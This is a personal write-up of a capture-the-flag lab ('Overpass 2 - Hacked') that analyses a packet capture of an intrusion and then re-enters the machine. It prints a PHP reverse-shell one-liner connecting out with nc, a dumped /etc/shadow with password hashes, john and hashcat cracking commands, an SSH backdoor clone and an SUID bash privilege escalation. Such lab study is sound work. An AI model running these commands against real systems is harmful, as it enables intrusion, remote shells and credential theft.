@@ -1,0 +1,195 @@
+Name: Overpass 2 - Hacked
+Date: 30/11/2022
+Difficulty: Easy
+Description: Overpass has been hacked! Can you analyse the attacker's actions and hack back in?
+Better Description: Cool idea of start with packets and hack back into the machine, very cool.
+Goals: Continue the Offensive Pentest path 
+Learnt: Better package analysis, basic backdooring 
+
+
+Starting with packet analysis:
+Question1: /development/
+PACKET 6:
+contains
+
+    <!DOCTYPE html>\n
+    <html>\n
+    \n
+    <head>\n
+      <style>\n
+        .formTitle {\n
+          margin: 0;\n
+        }\n
+    \n
+        /* form {\n
+          display: table;\n
+        }\n
+    \n
+        form div {\n
+          display: table-row;\n
+        }\n
+    \n
+        form div label {\n
+          display: table-cell;\n
+        } */\n
+    \n
+        .formElem label {\n
+          width: 10rem;\n
+          margin: 0 1rem 0 0;\n
+        }\n
+      </style>\n
+      <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">\n
+      <title>!!BETA!! - Cloud Sync</title>\n
+    </head>\n
+    \n
+    <body>\n
+      <nav>\n
+        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">\n
+        <h2 class="navTitle"><a href="/">Overpass</a></h2>\n
+        <a href="/aboutus">About Us</a>\n
+        <a href="/downloads">Downloads</a>\n
+      </nav>\n
+      <div class="bodyFlexContainer content">\n
+        <div>\n
+          <div>\n
+            <h3 class="formTitle">Overpass Cloud Sync - BETA</h1>\n
+          </div>\n
+          <!-- Muiri tells me this is insecure, I only learnt PHP this week so maybe I should let him fix it? Something about php eye en eye? -->\n
+          <!-- TODO add downloading of your overpass files -->\n
+          <form action="upload.php" method="post" enctype="multipart/form-data">\n
+            <div class="formElem"><label for="fileToUpload">Upload your .overpass file for cloud synchronisation</label><input type="file"\n
+                name="fileToUpload" id="fileToUpload"></div>\n
+            <div class="formElem"><input type="submit" value="Upload File" name="submit"></div>\n
+          </form>\n
+        </div>\n
+      </div>\n
+    \n
+    \n
+    </body>\n
+    \n
+    </html>
+
+
+Question2: packet 14 contains
+reverse shell:
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?> 
+
+
+Question 3:filter tcp
+packet 76 whenevernoteartinstant
+
+
+Note: under tcp filter packet 103 contains sudo -l enumeration
+THEN cat /etc/shadow to get all passwords: response in plaintext as this nc shell is in plaintext
+james@overpass-production:~$ sudo cat /etc/shadow
+sudo cat /etc/shadow
+root:*:18295:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+sshd:*:18464:0:99999:7:::
+james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
+paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
+szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
+bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
+muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
+
+Question4:
+packect 120: 
+git clone https://github.com/NinjaJc01/ssh-backdoor
+
+Qusetion5: 4 -> goto follow tcp stream of packet 120 and copy the contents of /etc/shadow file
+into a file I'll call shadow for the following john command
+then:
+either use rockyou.txt from tryhackme (it'll take lon) or search for fasttrack wordlist online
+john --wordlist=/fasttrack.txt shadow
+
+paradox's won't be crackable 
+
+Follow task goto github ->
+https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go
+Question6: 
+Generally in go you want to declare any methods hard coded variables, const, structs before main
+bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
+
+
+Question7: 1c362db832f3f864c8c2fe05f2002a05
+The verifyPass function called on line 108, passes the above salt to parametre of that function in golang stardard practice of naming simplicity, salt:
+func verifyPass(hash, salt, password string) bool 
+-> inlined the hashPassword function from line 60 to then return the bool of whether resultHash == the valupass to the function as hash
+
+Question8: follow the tcp from packet 32
+skip over the
+120 -> 3410 are the github clone of the sshbackdoor downloading.
+
+ssh-keygen 3436
+
+The hash appears in plain text in packet 3479 as:
+6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+
+Question9:
+
+copy the hash into a file then to append the hardcoded salt to the end of the hash we save using
+echo ":" (REMEMBER TO ADD THE COLON as a separator" 
+echo ":1c362db832f3f864c8c2fe05f2002a05" >> hash  
+
+Then crack with either:
+GOTO -> wiki ssh-keygen -> find the latest version as this was generated in 2020 -> "Ed25519 is the EdDSA signature scheme using SHA-512"
+GOTO -> https://hashcat.net/wiki/doku.php?id=example_hashes -> [ctrl+f] 
+BECAUSE the salt in the golang function is passed after in:
+func hashPassword(password string, salt string) string {
+        hash := sha512.Sum512([]byte(password + salt))
+        return fmt.Sprintf("%x", hash)
+
+we want the 1710 hashcat format!
+
+hashcat --force -m 1710 -a 0 hash /wordlistdirectory/rockyou.txt
+
+Question10: GOTO -> http://thmmachineip 
+H4ck3d by CooctusClan
+
+From Wireshark :
+SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
+so 
+
+ssh james@ip -p 2222
+
+cat /home/james/user.txt 
+
+THEN:
+
+Either manually enumerate or use script to enumerate:
+
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+/home/james/.suid_bash
+
+GOTO -> https://gtfobins.github.io/gtfobins/bash/#suid
+~/.suid_bash -p
+
+THEN:
+cat /root/root.tx
